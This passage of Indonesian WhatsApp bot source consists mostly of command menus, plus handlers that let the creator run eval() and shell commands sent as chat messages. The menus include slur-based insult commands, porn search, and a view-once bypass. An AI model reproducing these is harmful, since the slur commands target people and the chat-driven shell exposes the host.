• ${prefix}metaldark *text*
• ${prefix}neonlight *text*
• ${prefix}holographic *text*
• ${prefix}text1917 *text*
• ${prefix}minion *text*
• ${prefix}deluxesilver *text*
• ${prefix}newyearcard *text*
• ${prefix}bloodfrosted *text*
• ${prefix}halloween *text*
• ${prefix}jokerlogo *text*
• ${prefix}fireworksparkle *text*
• ${prefix}natureleaves *text*
• ${prefix}bokeh *text*
• ${prefix}toxic *text*
• ${prefix}strawberry *text*
• ${prefix}box3d *text*
• ${prefix}roadwarning *text*
• ${prefix}breakwall *text*
• ${prefix}icecold *text*
• ${prefix}luxury *text*
• ${prefix}cloud *text*
• ${prefix}summersand *text*
• ${prefix}horrorblood *text*
• ${prefix}thunder *text*`

let menuowner = `*OWNER-MENU*
• ${prefix}public
• ${prefix}self
• ${prefix}warcallid *id|text*
• ${prefix}cleardb
• ${prefix}adduserdb *reply*
• ${prefix}deluserdb *reply*
• ${prefix}adduserdbgc
• ${prefix}listdbuser
• ${prefix}unbanned *mention or reply*
• ${prefix}addprem *mention or reply*
• ${prefix}delprem *mention or reply*
• ${prefix}setprefix *symbol*
• ${prefix}setcover *link photo*
• ${prefix}setppbot *reply photo*
• ${prefix}delppbot
• ${prefix}block *mention or reply*
• ${prefix}unblock *mention or reply*
• ${prefix}listblock
• ${prefix}delchat
• ${prefix}readvo *reply viewonce*
• ${prefix}setnamabot *nama*
• ${prefix}setbiobot *bionya*
• ${prefix}welcome *on / off*
• ${prefix}anticall *on / off*
• ${prefix}antilink *on / off*
• ${prefix}autoai *on / off*
• ${prefix}autodownload *on / off*
• ${prefix}auto-ai *on / off*
• ${prefix}anticall *on / off*
• ${prefix}autoreadsw *on / off*`

let menusearch = `*SEARCHING-MENU*
• ${prefix}play *text*
• ${prefix}spotify *title*
• ${prefix}spotifysearch *title*
• ${prefix}pinterest *text*
• ${prefix}ytvideo *text*
• ${prefix}yts *querry*
• ${prefix}ssweb *link*
• ${prefix}google *text*
• ${prefix}nontontv
• ${prefix}ghstalk *username*
• ${prefix}igstalk *username*
• ${prefix}tiktokstalk *username*
• ${prefix}npmsearch *pack name*
• ${prefix}weather *lokasi*
• ${prefix}aiimg *text*
• ${prefix}gimage *text*
• ${prefix}textimg *prompt*
• ${prefix}bingimg *prompt*
• ${prefix}translate *reply text*
• ${prefix}jarak *kota|kota*
• ${prefix}lirik *judul lagu*
• ${prefix}xnxxs *title*
• ${prefix}pornhubgif *judul*
• ${prefix}animesearch *title*
• ${prefix}hentaisearch *judul :D*`

let menuchatbot = `*AI-MENU*
• ${prefix}ai *ask*
• ${prefix}hutao *ask*
• ${prefix}nobara *ask*
• ${prefix}elaina *ask*
• ${prefix}miku *ask*
• ${prefix}cai *char & text*
    
*DIFFUSION-MENU*
• ${prefix}toanime *reply foto*
• ${prefix}diffusion *prompt*
• ${prefix}remini *reply gambar*
• ${prefix}txt2img *prompt*
• ${prefix}jadi *modelnya*
• ${prefix}differentme *modelnya*`

let menuconvert = `*CONVERTER*
• ${prefix}say *text*
• ${prefix}toonce *media*
• ${prefix}smeme *image & text*
• ${prefix}qc *text*
• ${prefix}qcimg *text*
• ${prefix}smeta *reply sticker*
• ${prefix}sticker *reply image/video*
• ${prefix}toimg *reply sticker*
• ${prefix}toptv *reply video*
• ${prefix}tomp4 *reply sticker*
• ${prefix}toaudio *reply video*
• ${prefix}tomp3 *reply video*
• ${prefix}togif *reply video*
• ${prefix}toqr *link or text*
• ${prefix}tovn *reply audio*
• ${prefix}remini *reply gambar*`

let menudownload = `*DOWNLOADER-MENU*
• ${prefix}ytsearch *judul*
• ${prefix}ytreels *link*
• ${prefix}getmusic *reply yts*
• ${prefix}getvideo *reply yts*
• ${prefix}ytvideo *judul video*
• ${prefix}ytmp3 *link youtube*
• ${prefix}ytmp4 *link youtube*
• ${prefix}ytdok *link youtube*
• ${prefix}ytvn *link youtube*
• ${prefix}ytvideo *link youtube*
• ${prefix}tiktok *link tiktok*
• ${prefix}capcutdl *link*
• ${prefix}megadl *link*
• ${prefix}fbdl *link*
• ${prefix}spotifydl *link*
• ${prefix}igdl *link*
• ${prefix}gitclone *link*
• ${prefix}mediafire *link*
• ${prefix}happymod *game name*
• ${prefix}gdrive *link*`

let menuephoto = `*MAKERMENU*
• ${prefix}credit
• ${prefix}glitchtext *text*
• ${prefix}writetext *text*
• ${prefix}advancedglow *text*
• ${prefix}typographytext *text*
• ${prefix}pixelglitch *text*
• ${prefix}neonglitch *text*
• ${prefix}flagtext *text*
• ${prefix}flag3dtext *text*
• ${prefix}deletingtext *text*
• ${prefix}blackpinkstyle *text*
• ${prefix}glowingtext *text*
• ${prefix}underwatertext *text*
• ${prefix}logomaker *text*
• ${prefix}cartoonstyle *text*
• ${prefix}papercutstyle *text*
• ${prefix}watercolortext *text*
• ${prefix}effectclouds *text*
• ${prefix}blackpinklogo *text*
• ${prefix}gradienttext *text*
• ${prefix}summerbeach *text*
• ${prefix}luxurygold *text*
• ${prefix}multicoloredneon *text*
• ${prefix}sandsummer *text*
• ${prefix}galaxywallpaper *text*
• ${prefix}1917style *text*
• ${prefix}makingneon *text*
• ${prefix}royaltext *text*
• ${prefix}freecreate *text*
• ${prefix}galaxystyle *text*
• ${prefix}lighteffects *text*`

let menuprimbon = `*PRIMBON-MENU*
• ${prefix}credit
• ${prefix}artinama *text*
• ${prefix}artimimpi *text*
• ${prefix}kecocokanpasangan *text*
• ${prefix}kecocokannama *text*
• ${prefix}jadianpernikahan *text*
• ${prefix}rezeki *text*
• ${prefix}sifatusaha *text*
• ${prefix}pekerjaan *text*
• ${prefix}artitarot *text*
• ${prefix}potensipenyakit *text*
• ${prefix}ramalannasib *text*
• ${prefix}harisangar *text*
• ${prefix}haribaik *text*
• ${prefix}fengshui *text*
• ${prefix}nagahari *text*
• ${prefix}harinaas *text*
• ${prefix}weton *text*
• ${prefix}peruntungan *text*
• ${prefix}arahrejeki *text*
• ${prefix}sifat *text*
• ${prefix}kebetuntungan *text*
• ${prefix}memancing *text*
• ${prefix}masasubur *text*
• ${prefix}zodiak *text*
• ${prefix}shio *text*`

let menugroup = `*GROUP-MENU*
• ${prefix}credit
• ${prefix}rules
• ${prefix}warcall *text*
• ${prefix}getcontact *tag*
• ${prefix}sendcontact *tag*
• ${prefix}contacttag *tag*
• ${prefix}kontakme
• ${prefix}menfess *pesannya*
• ${prefix}setcmd *command*
• ${prefix}listcmd
• ${prefix}delcmd *command*
• ${prefix}timergc *waktu*
• ${prefix}afk *alasan*
• ${prefix}tagall *text*
• ${prefix}kudeta *berbahaya*
• ${prefix}idgc
• ${prefix}promoteall *adminkan semua*
• ${prefix}demoteall *unadmin semua*
• ${prefix}hidetag *text*
• ${prefix}cekgc *link*
• ${prefix}ppcp/couple
• ${prefix}getname *mention or reply*
• ${prefix}getpp *mention or reply*
• ${prefix}getbio *mention or reply*
• ${prefix}delete *reply pesan*
• ${prefix}promote *mention or reply*
• ${prefix}demote *mention or reply*
• ${prefix}add *number*
• ${prefix}kick *mention or reply*
• ${prefix}infogrup
• ${prefix}linkgrup
• ${prefix}grup *open / close*
• ${prefix}revoke 
• ${prefix}join *Link Grup*
• ${prefix}left 
• ${prefix}setppgrup *reply photo*
• ${prefix}setgrupname *text*
• ${prefix}setdesc *text*
• ${prefix}pushkontakfrom *text*`

let menuanime = `*ANIME-MENU*
• ${prefix}cogan
• ${prefix}elaina2
• ${prefix}exo
• ${prefix}elf
• ${prefix}estetic
• ${prefix}kanna
• ${prefix}loli
• ${prefix}shota
• ${prefix}husbu
• ${prefix}sagiri
• ${prefix}shinobu
• ${prefix}megumin
• ${prefix}wallnime
• ${prefix}neko
• ${prefix}waifu
• ${prefix}kill
• ${prefix}pat
• ${prefix}lick
• ${prefix}bite
• ${prefix}yeet
• ${prefix}bonk
• ${prefix}wink
• ${prefix}poke
• ${prefix}nom
• ${prefix}slap
• ${prefix}smile
• ${prefix}wave
• ${prefix}blush
• ${prefix}smug
• ${prefix}glomp
• ${prefix}happy
• ${prefix}dance
• ${prefix}cringe
• ${prefix}highfive
• ${prefix}handhold
• ${prefix}akira 
• ${prefix}akiyama 
• ${prefix}ana 
• ${prefix}asuna 
• ${prefix}ayuzawa 
• ${prefix}boruto 
• ${prefix}chiho 
• ${prefix}chitoge 
• ${prefix}cosplayloli 
• ${prefix}cosplaysagiri 
• ${prefix}deidara 
• ${prefix}doraemon 
• ${prefix}elena
• ${prefix}emilia 
• ${prefix}erza 
• ${prefix}gremory 
• ${prefix}hestia 
• ${prefix}hinata 
• ${prefix}husbu 
• ${prefix}inori 
• ${prefix}isuzu 
• ${prefix}itachi 
• ${prefix}itori 
• ${prefix}kaga 
• ${prefix}kagura 
• ${prefix}kakasih 
• ${prefix}kaori 
• ${prefix}keneki 
• ${prefix}kotori 
• ${prefix}kurumi 
• ${prefix}loli 
• ${prefix}madara 
• ${prefix}megumin 
• ${prefix}mikasa 
• ${prefix}mikey 
• ${prefix}miku 
• ${prefix}minato 
• ${prefix}naruto 
• ${prefix}neko 
• ${prefix}neko2 
• ${prefix}nekonime 
• ${prefix}nezuko 
• ${prefix}onepiece 
• ${prefix}pokemon 
• ${prefix}randomnime 
• ${prefix}randomnime2 
• ${prefix}rize 
• ${prefix}sagiri 
• ${prefix}sakura 
• ${prefix}sasuke 
• ${prefix}shina 
• ${prefix}shinka 
• ${prefix}shinomiya 
• ${prefix}shizuka 
• ${prefix}shota 
• ${prefix}tejina 
• ${prefix}toukachan 
• ${prefix}tsunade 
• ${prefix}waifu 
• ${prefix}animewall 
• ${prefix}yotsuba 
• ${prefix}yuki 
• ${prefix}yulibocil 
• ${prefix}yumeko
• ${prefix}8ball
• ${prefix}tickle
• ${prefix}gecg
• ${prefix}feed`

let menurpg = `*RPG-MENU*
• ${prefix}inventory
• ${prefix}mining
• ${prefix}buy
• ${prefix}sell
• ${prefix}heal
• ${prefix}hunt
• ${prefix}adventure
• ${prefix}luckyday
• ${prefix}killslime
• ${prefix}killgoblin
• ${prefix}killdevil
• ${prefix}killbehemoth
• ${prefix}killdemon
• ${prefix}killdemonking
• ${prefix}joinrpg
• ${prefix}sellikan
• ${prefix}sellbesi
• ${prefix}sellemas
• ${prefix}jelajah
• ${prefix}mancing
• ${prefix}jualikan
• ${prefix}jualcoal
• ${prefix}jualstone
• ${prefix}jualingot
• ${prefix}jualkayu
• ${prefix}jualbahankimia
• ${prefix}lebur
• ${prefix}nebang
• ${prefix}goplanet
• ${prefix}ojek`

let menuaudio =  `AUDIO-MANIPULATION-CREATE*
• ${prefix}addvn *audio*
• ${prefix}listvn *audio*
• ${prefix}delvn *audio*
• ${prefix}bass *reply audio*
• ${prefix}deep *reply audio*
• ${prefix}slow *reply audio*
• ${prefix}blown
• ${prefix}smooth
• ${prefix}earrape
• ${prefix}fast
• ${prefix}fat
• ${prefix}reverse
• ${prefix}nightcore
• ${prefix}robot
• ${prefix}squirrel`

let menugame = `*GAME-MENU*
  ⏣ • ${prefix}werewolf
  ⏣ • ${prefix}suit *mention or reply*
  ⏣ • ${prefix}tictactoe *mention or reply*
  ⏣ • ${prefix}delttt
  ⏣ • ${prefix}petakbom
  ⏣ • ${prefix}delpetakbom
  ⏣ • ${prefix}tebakgambar
  ⏣ • ${prefix}tebakanime
  ⏣ • ${prefix}tebakkabupaten
  ⏣ • ${prefix}tebaklagu
  ⏣ • ${prefix}kuis
  ⏣ • ${prefix}tebakkalimat
  ⏣ • ${prefix}tebakkata
  ⏣ • ${prefix}tebaklirik
  ⏣ • ${prefix}tebakkimia
  ⏣ • ${prefix}tebakbendera
  ⏣ • ${prefix}susunkata
  ⏣ • ${prefix}asahotak
  ⏣ • ${prefix}siapakahaku
  ⏣ • ${prefix}caklontonh
  ⏣ • ${prefix}math
  ⏣ • ${prefix}family100`

let menushop = `*SHOP-MENU*
• ${prefix}saldo *lihat saldo anda*
• ${prefix}ceksaldo *tag/reply*
• ${prefix}transfer *reply + nominal*
• ${prefix}topup *nominal*
• ${prefix}cekmin *bukti prabayar*
• ${prefix}belipanel *lakukan pembelian*
• ${prefix}addusr *beli user panel anda*
• ${prefix}buyserver *beli server user*
• ${prefix}addusr *gratis buat user*
• ${prefix}addsrv *gunakan saldo*
• ${prefix}addusradmin *untuk creator*
• ${prefix}addsaldo *untuk creator*
• ${prefix}listpanel *lihat harga*
• ${prefix}listvps  *lihat harga*
• ${prefix}listusr *data user*
• ${prefix}listsrv *data server*
• ${prefix}startsrv *ID server*
• ${prefix}stopsrv *ID server*`

let menufun = `*FUN-MENU*
• ${prefix}createqr *text*
• ${prefix}detectqr *reply qr*
• ${prefix}apakah *text*
• ${prefix}bagaimanakah *text*
• ${prefix}kapankah *text*
• ${prefix}bisakah *text
• ${prefix}sangecek *tag*
• ${prefix}cantikcek *tag*
• ${prefix}gantengcek *tag*
• ${prefix}jomokcek *tag*
• ${prefix}wangy *tag*
• ${prefix}rate
• ${prefix}tolol
• ${prefix}goblog
• ${prefix}goblok
• ${prefix}idiot
• ${prefix}gay
• ${prefix}jomok
• ${prefix}bajingan
• ${prefix}munafik
• ${prefix}kontol
• ${prefix}yatim
• ${prefix}poke
• ${prefix}pembokep
• ${prefix}hitam
• ${prefix}jawa
• ${prefix}wibu
• ${prefix}stress
• ${prefix}miskin
• ${prefix}cantik
• ${prefix}manis
• ${prefix}babi
• ${prefix}ganteng
• ${prefix}cina
• ${prefix}atheis
• ${prefix}papua
• ${prefix}nigga
• ${prefix}pengentot
• ${prefix}seksi
• ${prefix}kawai
• ${prefix}tercindo
• ${prefix}fembokef
• ${prefix}pengocok
• ${prefix}cabul
• ${prefix}fuckboy
• ${prefix}playboy
• ${prefix}sange
• ${prefix}sangean
• ${prefix}hot`
    if (args[0] == 'nsfw'){
    if (!isGroup) return onlyGroup()
    sendres(from, menunsfw)
    } else
    if (args[0] == 'tools'){
    sendres(from, menutools)
    } else if (args[0] == 'asupan'){
    sendres(from, menuasupan)
    } else if (args[0] == 'photoxy'){
    sendres(from, menuphotoxy)
    } else if (args[0] == 'jadibot'){
    sendres(from, menujadibot)
    } else if (args[0] == 'textpro'){
    sendres(from, menutextpro)
    } else if (args[0] == 'owner'){
    sendres(from, menuowner)
    } else if (args[0] == 'search'){
    if (!isGroup) return onlyGroup()
    sendres(from, menusearch)
    } else if (args[0] == 'chatbot'){
    sendres(from, menuchatbot)
    } else if (args[0] == 'random'){
    if(!isGroup) return onlyGroup()
    sendres(from, menurandom)
    } else if (args[0] == 'convert'){
    sendres(from, menuconvert)
    } else if (args[0] == 'download'){
    sendres(from, menudownload)
    } else if (args[0] == 'ephoto'){
    if (!isGroup) return onlyGroup()
    sendres(from, menuephoto)
    } else if (args[0] == 'primbon'){
    if (!isGroup) return onlyGroup()
    sendres(from, menuprimbon)
    } else if (args[0] == 'group'){
    if (!isGroup) return onlyGroup()
    sendres(from, menugroup)
    } else if (args[0] == 'anime'){
    sendres(from, menuanime)
    } else if (args[0] == 'rpg'){
    if (!isGroup) return onlyGroup()
    sendres(from, menurpg)
    } else if (args[0] == 'sound'){
    sendres(from, menusound)
    } else if (args[0] == 'audio'){
    sendres(from, menuaudio)
    } else if (args[0] == 'game'){
    sendres(from,menugame)
    } else if (args[0] == 'shop'){
    sendres(from, menushop)
    } else if (args[0] == 'fun'){
    if (!isGroup) return onlyGroup()
    sendres(from, menufun)
    } else if (args[0] == 'all'){
    sendres(from, `_regards x-znn_`)
znn.chatModify({ archive: true, lastMessages: [m] }, sender)
    } else sendres(from, menuutama)
//znn.sendMessage(from, { audio: fs.readFileSync('./assets/audio/znn Team.m4a'), mimetype:'audio/mpeg', ptt:false})
break
case 'ping': {
const used = process.memoryUsage()
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `*CONNECTION SPEED*
Response Speed : *${latensi.toFixed(4)}* / second

*SERVER INFO*
Ram : ${FileSize(process.memoryUsage().rss)} / ${process.env.SERVER_MEMORY ?? 0} MB

*MEMORY USED*
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}`.trim()
 reply795(respon)
				}
				break
 case 'runtime':{
 reply(`*znn* active during *${runtime(process.uptime())}*`)
  }
	break
// BATAS AKHIR
default:
if (body.startsWith('>')) {
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
try {
let evaled = await eval(body.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (body.startsWith('$')){
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
qur = body.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply795(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (body.startsWith('<')) {
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

}
} catch (err) {
m.reply(util.format(err))
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})